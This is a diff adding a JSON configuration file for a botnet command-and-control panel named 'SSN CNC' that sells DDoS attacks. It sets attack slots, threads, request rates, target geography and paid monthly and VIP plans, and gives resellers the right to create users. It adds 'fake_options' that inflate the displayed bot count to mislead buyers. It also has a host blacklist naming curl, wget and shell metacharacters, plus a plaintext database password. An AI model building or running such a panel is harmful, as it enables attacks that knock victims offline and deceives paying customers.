@@ -1,0 +1,755 @@
+{
+    "license_key": "YOUR LICENSE KEY GOES HERE",
+    "ssh_server_config": {
+        "server_ip_address": "YOUR SERVER IP GOES HERE",
+        "private_key": "assets/sshKey.ppk"
+    },
+    "cnc_whitelisting": {
+        "enabled": false,
+        "whitelisted_ips": []
+    },
+    "api_access_config": {
+        "note": "Put port 80 below if you plan on using Cloudflare to protect your API.",
+        "api_ip_address": "YOUR SERVER IP GOES HERE (MAKE SURE TO ENABLE IT ON LINE 16 AND RUN `service apache2 stop` ON YOUR SERVER)",
+        "api_port": 80,
+        "settings": {
+            "api_access_enabled": false,
+            "debug_mode_enabled": false,
+            "custom_attack_sent_page": {
+                "enabled": false,
+                "html_file": "attack_sent.html"
+            },
+            "developer": {
+                "subdirectory": {
+                    "api": "api",
+                    "admin": "admin"
+                },
+                "path": {
+                    "api": {
+                        "attack": "attack",
+                        "view_ongoing": "view_ongoing",
+                        "view_plan": "view_plan",
+                        "network_statistics": "network_statistics"
+                    },
+                    "admin": {
+                        "view_user_plan": "view_user_plan",
+                        "view_user_logs": "view_user_logs",
+                        "view_all_logs": "view_all_logs",
+                        "view_all_users": "view_all_users",
+                        "add_user": "add_user",
+                        "edit_user": "edit_user",
+                        "remove_user": "remove_user",
+                        "key_info": "key_info"
+                    }
+                }
+            }
+        },
+        "additional_security": {
+            "force_tls": false,
+            "domain_lock": {
+                "note": "Enabling this will only allow people to access your API with the domain below.",
+                "enabled": false,
+                "domain": "api.com"
+            }
+        }
+    },
+    "database": {
+        "host": "localhost:3306",
+        "username": "user723432",
+        "password": "RBkijsHcqLJpiSTq7hrSsfdpQQq6KE6a?!",
+        "table": "db834674"
+    },
+    "settings": {
+        "initial_connection": {
+            "display_banner": {
+                "enabled": false,
+                "message": "**** Authorized users and purposes only - Violators will be prosecuted ****\r\n\r\nAccess to this and use of system are restricted to authorized users and\r\ndesignated purposes. Unauthorized acccess or access attempts to this system,\r\nas well as use of this system for prohibited purposes are a crime. Criminal\r\ntrespass to this system will be prosecuted.\r\n\r\nTo maintain proper system operation and detect/deter unauthorized use, system\r\nadministrators may monitor this system. All user activities may be observed,\r\nrecorded, and/or subject to automated logging.\r\n\r\n * Acceptance and Agreement *\r\nContinuing past this point constitutes attestation of your authorization to\r\naccess this system, agreement that your use of this system falls within the\r\nscope of allowed purposes, and your acceptance of and consent to monitoring,\r\nlogging, and recording of your activities.\r\n\r\n * Disagreement *\r\nIf you do not agree to all of the above, you must immediately disconnect from\r\nthis system."
+            },
+            "max_wrong_password_attempts": 3
+        },
+        "multi_factor_authentication": {
+            "forced": false,
+            "app_name": "My Cool Botnet",
+            "forced_on_who": {
+                "note": "Only enable one of the options below. ('all_users', 'exclude_users', 'single_users', 'exclude_admin')",
+                "all_users": false,
+                "exclude_users": {
+                    "note": "Enabling this will force everyone to do a login captcha except the users below.",
+                    "enabled": false,
+                    "usernames": [
+                        "root"
+                    ]
+                },
+                "single_users": {
+                    "note": "Enabling this will only force the users below to do a login captcha.",
+                    "enabled": false,
+                    "usernames": []
+                },
+                "exclude_admin": true
+            }
+        },
+        "login_captcha": {
+            "forced": false,
+            "ascii": true,
+            "forced_on_who": {
+                "note": "Only enable one of the options below. ('all_users', 'exclude_users', 'single_users', 'exclude_admin')",
+                "all_users": false,
+                "exclude_users": {
+                    "note": "Enabling this will force everyone to do a login captcha except the users below.",
+                    "enabled": false,
+                    "usernames": [
+                        "root"
+                    ]
+                },
+                "single_users": {
+                    "note": "Enabling this will only force the users below to do a login captcha.",
+                    "enabled": false,
+                    "usernames": []
+                },
+                "exclude_admin": true
+            }
+        },
+        "prompt": {
+            "gradient": {
+                "enabled": false,
+                "settings": {
+                    "initial_hex_colour": "00FFFB",
+                    "final_hex_colour": "FB00FF"
+                },
+                "suffix_settings": {
+                    "suffix_space": false,
+                    "suffix_colour": "[97m",
+                    "suffix_text": ""
+                },
+                "note": "Only enable one of the options below. ('foreground', 'background')",
+                "foreground": {
+                    "enabled": true
+                },
+                "background": {
+                    "enabled": false,
+                    "text_colour": "[30m"
+                }
+            }
+        },
+        "logging": {
+            "log_ips": false,
+            "log_attacks_to_file": true,
+            "log_failed_api_requests": true
+        },
+        "timeouts": {
+            "api_timeout_seconds": 30,
+            "server_timeout_seconds": 30,
+            "botnet_timeout_seconds": 30,
+            "max_idle_seconds": 999999
+        },
+        "visual": {
+            "classic_ongoing_command": false,
+            "classic_online_command": false,
+            "forced_use_of_dport": false
+        },
+        "reseller_permissions": {
+            "can_create_how_many_users_per_day": 3,
+            "can_edit_users_they_made": true,
+            "can_view_user_count_command": true,
+            "can_remove_users_they_made": true,
+            "can_kick_users_they_made": true,
+            "can_ban_users_they_made": true,
+            "can_lock_users_they_made": true,
+            "can_view_users_they_made": true,
+            "can_change_pass_of_users_they_made": true,
+            "can_add_new_resellers": true
+        },
+        "general": {
+            "first_login": {
+                "initial_username_change": false,
+                "initial_password_change": true,
+                "allow_account_override_on_first_login": false
+            },
+            "options": {
+                "api_options": {
+                    "allow_multi_concurrent_api_attacks": false,
+                    "api_users_can_send_attacks_from_cnc": true
+                },
+                "guest_user": {
+                    "note": "Enabling this will prevent the username below from changing their password.",
+                    "enabled": false,
+                    "username": "guest"
+                },
+                "new_user_defaults": {
+                    "theme": "default",
+                    "max_daily_attacks": 1000
+                },
+                "misc": {
+                    "cnc_name": "SSN CNC",
+                    "title_update_sleep_ms": 1500,
+                    "tos_page_enabled": false,
+                    "numverify_access_key": "numverify.com api key goes here",
+                    "expired_message": "Your account has expired.",
+                    "username_blacklists": [],
+                    "super_users": [
+                        "root"
+                    ]
+                }
+            },
+            "fake_options": {
+                "bots": {
+                    "max": 1640,
+                    "min": 1630
+                },
+                "online_users": {
+                    "enabled": false,
+                    "add_extra": 25
+                },
+                "ongoing_attacks": {
+                    "enabled": false,
+                    "add_extra": 25
+                }
+            },
+            "home_holder_custom_concurrents": {
+                "enabled": false,
+                "home_holder_method_name": "hold",
+                "options": {
+                    "note": "THIS IS BEING WORKED ON. Only enable one of the two options below. ('all' or 'select')",
+                    "all": {
+                        "enabled": true,
+                        "home_holder_concurrents": 1
+                    },
+                    "select": {
+                        "enabled": false,
+                        "who_has_access": [
+                            {
+                                "username": "root",
+                                "home_holder_concurrents": 1
+                            }
+                        ]
+                    }
+                }
+            },
+            "information_rewrites": {
+                "online_command": {
+                    "user_ip_address": {
+                        "hide": true,
+                        "hidden_text": "*.*.*.*"
+                    },
+                    "user_username": {
+                        "hide": true,
+                        "hidden_text": "User"
+                    },
+                    "unknown_ssh_client": "Unknown"
+                },
+                "ongoing_command": {
+                    "target": {
+                        "hide": false,
+                        "hidden_text": "?"
+                    },
+                    "method": {
+                        "hide": true,
+                        "hidden_text": "?"
+                    },
+                    "port": {
+                        "hide": true,
+                        "hidden_text": "?"
+                    },
+                    "duration": {
+                        "hide": true,
+                        "hidden_text": "?"
+                    },
+                    "remaining": {
+                        "hide": false,
+                        "hidden_text": "?"
+                    },
+                    "attack_sender": {
+                        "hide": true,
+                        "hidden_text": "?"
+                    }
+                },
+                "host_information": {
+                    "unknown_region": "?",
+                    "unknown_country": "?",
+                    "unknown_country_code": "?",
+                    "unknown_city": "?",
+                    "unknown_zip": "?",
+                    "unknown_isp": "?",
+                    "unknown_asn": "?",
+                    "unknown_org": "?",
+                    "unknown_timezone": "?"
+                }
+            },
+            "dlc_options": {
+                "aio_funnel": {
+                    "information": "you must have the paid aio funnel dlc to use this feature",
+                    "note": "if you enable the option on the line below, your attacks will be sent through 'assets/dlc/funnel.json'",
+                    "enabled": false
+                },
+                "telegram_bot": {
+                    "information": "you must have the paid telegram dlc to use this feature",
+                    "enabled": false,
+                    "bot_token": "",
+                    "bot_debug_mode_enabled": false,
+                    "bot_timeout_seconds": 30,
+                    "start_message": ""
+                },
+                "gambling": {
+                    "information": "you must have the paid gambling dlc to use this feature",
+                    "note": "if you enable the option on the line below, you can check out 'assets/dlc/gambling.json'",
+                    "enabled": false
+                },
+                "reverse_proxy": {
+                    "information": "you must have the paid reverse proxy dlc to use this feature",
+                    "enabled": false,
+                    "api_token": "",
+                    "api_host": "127.0.0.1",
+                    "api_port": 8089
+                }
+            },
+            "developer": {
+                "note": "BE CAREFUL WHEN MODIFYING THESE SETTINGS/OPTIONS.",
+                "terminal": {
+                    "width": 800,
+                    "height": 22
+                },
+                "resizing": {
+                    "online_command": {
+                        "enabled": false,
+                        "width": 80,
+                        "height": 24
+                    },
+                    "ongoing_command": {
+                        "enabled": false,
+                        "width": 80,
+                        "height": 24
+                    }
+                },
+                "table_styles": {
+                    "online": "compact",
+                    "ongoing": "compact"
+                },
+                "ghost_mode": false,
+                "disabled_commands": [],
+                "anti_close_open": ["root"],
+                "blocked_ssh_clients": [
+                    "ssh2js",
+                    "ubuntu"
+                ]
+            }
+        }
+    },
+    "attack_settings": {
+        "method_groups": [
+            {
+                "name": "Main Network",
+                "max_slots": 1000,
+                "cooldown": 0,
+                "custom_role_name": "main_network"
+            },
+            {
+                "name": "Private Network",
+                "max_slots": 3,
+                "cooldown": 0,
+                "custom_role_name": "private_network"
+            }
+        ],
+        "blacklists": {
+            "host": [
+                ".gov",
+                ".edu",
+                "curl",
+                "wget",
+                "echo",
+                "reboot",
+                "nano",
+                "mysql",
+                "localhost",
+                ";",
+                "|",
+                "[",
+                "]",
+                "<",
+                ">",
+                "{",
+                "}",
+                "+",
+                "\"",
+                "'",
+                "$",
+                "@",
+                "(",
+                ")",
+                "\\",
+                "`",
+                "0.0.0.",
+                "1.1.1.",
+                "127.0.0.",
+                "8.8.8."
+            ],
+            "port": [
+                19999
+            ],
+            "as_number": []
+        },
+        "user_spam_protection": {
+            "in_general": {
+                "settings": {
+                    "enabled": false,
+                    "amount": 10,
+                    "per_seconds": 1200
+                },
+                "what_action_to_take": {
+                    "note": "THIS IS BEING WORKED ON. Only enable one of the options below. ('warn_and_block_attack', 'give_captcha', 'lock_account', 'close_user_session')",
+                    "warn_and_block_attack": true,
+                    "give_captcha": false,
+                    "lock_account": {
+                        "message": "Automated account lock, reason: Spam",
+                        "duration_in_days": 7,
+                        "enabled": false
+                    },
+                    "close_user_cnc_session_and_block_attack": false
+                }
+            },
+            "per_target": {
+                "settings": {
+                    "enabled": false,
+                    "amount": 3,
+                    "per_seconds": 30
+                },
+                "what_action_to_take": {
+                    "note": "THIS IS BEING WORKED ON. Only enable one of the options below. ('warn_and_block_attack', 'give_captcha', 'lock_account', 'close_user_session')",
+                    "warn_and_block_attack": true,
+                    "give_captcha": false,
+                    "lock_account": {
+                        "message": "Automated account lock, reason: Spam",
+                        "duration_in_days": 7,
+                        "enabled": false
+                    },
+                    "close_user_cnc_session_and_block_attack": false
+                }
+            }
+        },
+        "attack_options": {
+            "general_options": {
+                "debug_mode_enabled": true,
+                "attacks_are_enabled": true,
+                "attacks_disabled_message": "All attacks are temporarily disabled.",
+                "admins_bypass_disabled_attacks": false,
+                "forced_use_of_threads": false,
+                "forced_use_of_len": false,
+                "per_api_request_delay": {
+                    "enabled": false,
+                    "per_api_request_delay_ms": 0
+                }
+            },
+            "slot_options": {
+                "total_attack_slots": {
+                    "max": 50,
+                    "enabled": true
+                },
+                "users_bypass_total_attack_slots": {
+                    "enabled": false,
+                    "usernames": []
+                },
+                "users_bypass_method_slots": {
+                    "enabled": false,
+                    "usernames": []
+                },
+                "users_bypass_method_group_slots": {
+                    "enabled": false,
+                    "usernames": []
+                }
+            },
+            "cooldown_options": {
+                "users_bypass_method_group_cooldown": {
+                    "enabled": false,
+                    "usernames": []
+                }
+            },
+            "cnc_options": {
+                "time_before_port": false,
+                "len_before_threads": false,
+                "cnc_global_cooldown": {
+                    "enabled": true,
+                    "per_attack_delay_ms": 100
+                },
+                "after_attack_command_cooldown": {
+                    "enabled": false,
+                    "seconds": 5
+                },
+                "len": {
+                    "default": 1,
+                    "max": 1024,
+                    "min": 1
+                },
+                "threads": {
+                    "default": 5,
+                    "max": 100,
+                    "min": 1
+                }
+            },
+            "api_options": {
+                "api_global_cooldown": {
+                    "enabled": true,
+                    "per_attack_delay_ms": 100
+                },
+                "show_host_information_in_api_response": true,
+                "len": {
+                    "default": 1,
+                    "max": 1024,
+                    "min": 1
+                },
+                "threads": {
+                    "default": 5,
+                    "max": 100,
+                    "min": 1
+                },
+                "rps": {
+                    "default": 64,
+                    "max": 300,
+                    "min": 1
+                },
+                "geo": {
+                    "default": "ALL",
+                    "list": [
+                        "CN",
+                        "JP",
+                        "US"
+                    ]
+                }
+            }
+        }
+    },
+    "webhooks": {
+        "telegram": {
+            "attack_sent": {
+                "token": "",
+                "title": "USER ATTACK SENT SUCCESSFULLY",
+                "chat_id": "",
+                "enabled": false
+            },
+            "blacklisted_host": {
+                "token": "",
+                "title": "USER TRIED ATTACKING BLACKLIST",
+                "chat_id": "",
+                "enabled": false
+            },
+            "ip_log": {
+                "token": "",
+                "title": "USER LOGGED IN",
+                "chat_id": "",
+                "enabled": false
+            },
+            "failed_mfa": {
+                "token": "",
+                "title": "USER FAILED MFA",
+                "chat_id": "",
+                "enabled": false
+            },
+            "failed_captcha": {
+                "token": "",
+                "title": "USER FAILED CAPTCHA",
+                "chat_id": "",
+                "enabled": false
+            },
+            "user_actions": {
+                "token": "",
+                "title": "USER ACTION ALERT",
+                "chat_id": "",
+                "enabled": false
+            },
+            "reseller_actions": {
+                "token": "",
+                "title": "RESELLER ACTION ALERT",
+                "chat_id": "",
+                "enabled": false
+            },
+            "admin_actions": {
+                "token": "",
+                "title": "ADMIN ACTION ALERT",
+                "chat_id": "",
+                "enabled": false
+            }
+        },
+        "discord": {
+            "attack_sent": {
+                "webhook": "",
+                "title": "USER ATTACK SENT SUCCESSFULLY",
+                "image": "https://www.clker.com/cliparts/0/f/7/0/11954234311954389563ok_mark_h_kon_l_vdal_02.svg.med.png",
+                "hex_color": "",
+                "enabled": false
+            },
+            "blacklisted_host": {
+                "webhook": "",
+                "title": "USER TRIED ATTACKING BLACKLIST",
+                "image": "https://www.clker.com/cliparts/5/9/5/4/12456868161725760927raemi_Cross_Out.svg.med.png",
+                "hex_color": "",
+                "enabled": false
+            },
+            "ip_log": {
+                "webhook": "",
+                "title": "USER LOGGED IN",
+                "image": "https://pluspng.com/img-png/attention-sign-png-attention-sign-traffic-road-sign-warning-caution-788.png",
+                "hex_color": "",
+                "enabled": false
+            },
+            "failed_mfa": {
+                "webhook": "",
+                "title": "USER FAILED MFA",
+                "image": "http://www.clker.com/cliparts/f/3/8/9/1194984837281670682DangerGeneral.svg.med.pngg",
+                "hex_color": "",
+                "enabled": false
+            },
+            "failed_captcha": {
+                "webhook": "",
+                "title": "USER FAILED CAPTCHA",
+                "image": "http://www.clker.com/cliparts/f/3/8/9/1194984837281670682DangerGeneral.svg.med.png",
+                "hex_color": "",
+                "enabled": false
+            },
+            "user_actions": {
+                "webhook": "",
+                "title": "USER ACTION ALERT",
+                "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/OOjs_UI_icon_alert_destructive.svg/480px-OOjs_UI_icon_alert_destructive.svg.png",
+                "hex_color": "",
+                "enabled": false
+            },
+            "reseller_actions": {
+                "webhook": "",
+                "title": "RESELLER ACTION ALERT",
+                "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/OOjs_UI_icon_alert_destructive.svg/480px-OOjs_UI_icon_alert_destructive.svg.png",
+                "hex_color": "",
+                "enabled": false
+            },
+            "admin_actions": {
+                "webhook": "",
+                "title": "ADMIN ACTION ALERT",
+                "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/OOjs_UI_icon_alert_destructive.svg/480px-OOjs_UI_icon_alert_destructive.svg.png",
+                "hex_color": "",
+                "enabled": false
+            }
+        }
+    },
+    "plan_presets": [
+        {
+            "name": "MONTHLY",
+            "options": {
+                "vip": {
+                    "enabled": false,
+                    "vip_duration_in_days": 1000
+                },
+                "reseller": false,
+                "mod": false,
+                "admin": false,
+                "custom_roles": {
+                    "enabled": true,
+                    "roles": [
+                        {
+                            "role_name": "Main Network",
+                            "role_duration_in_days": 30
+                        }
+                    ]
+                },
+                "api_access": false,
+                "bypass_power_saving": false,
+                "bypass_spam_protection": false,
+                "bypass_blacklist": false,
+                "bypass_soft_max_time": false,
+                "cooldown_in_seconds": 0,
+                "max_time_in_seconds": 300,
+                "max_concurrents": 1,
+                "plan_length_in_days": 30
+            }
+        },
+        {
+            "name": "MONTHLYVIP",
+            "options": {
+                "vip": {
+                    "enabled": true,
+                    "vip_duration_in_days": 1000
+                },
+                "reseller": false,
+                "mod": false,
+                "admin": false,
+                "custom_roles": {
+                    "enabled": false,
+                    "roles": [
+                        {
+                            "role_name": "Main Network",
+                            "role_duration_in_days": 30
+                        }
+                    ]
+                },
+                "api_access": false,
+                "bypass_power_saving": false,
+                "bypass_spam_protection": false,
+                "bypass_blacklist": false,
+                "bypass_soft_max_time": false,
+                "cooldown_in_seconds": 0,
+                "max_time_in_seconds": 300,
+                "max_concurrents": 1,
+                "plan_length_in_days": 30
+            }
+        }
+    ],
+    "themes": [
+        {
+            "name": "default",
+            "description": "",
+            "example": "assets/banners/default/branding/clear_splash.tfx",
+            "colour": "[97m"
+        }
+    ],
+    "custom_banners": [
+        {
+            "name": "methods",
+            "description": "View attack methods page.",
+            "require_role": {
+                "custom_role": {
+                    "enabled": false,
+                    "role_name": ""
+                },
+                "vip": false,
+                "reseller": false,
+                "mod": false,
+                "admin": false
+            },
+            "path_to_banner": "assets/banners/{THEME}/commands/methods.tfx",
+            "command_aliases": []
+        },
+        {
+            "name": "plan",
+            "description": "View your plan details.",
+            "require_role": {
+                "custom_role": {
+                    "enabled": false,
+                    "role_name": ""
+                },
+                "vip": false,
+                "reseller": false,
+                "mod": false,
+                "admin": false
+            },
+            "path_to_banner": "assets/banners/{THEME}/commands/plan.tfx",
+            "command_aliases": [
+                "acc",
+                "account"
+            ]
+        },
+        {
+            "name": "help",
+            "description": "View the help page.",
+            "require_role": {
+                "custom_role": {
+                    "enabled": false,
+                    "role_name": ""
+                },
+                "vip": false,
+                "reseller": false,
+                "mod": false,
+                "admin": false
+            },
+            "path_to_banner": "assets/banners/{THEME}/commands/help.tfx",
+            "command_aliases": [
+                "h",
+                "?"
+            ]
+        }
+    ]
+}
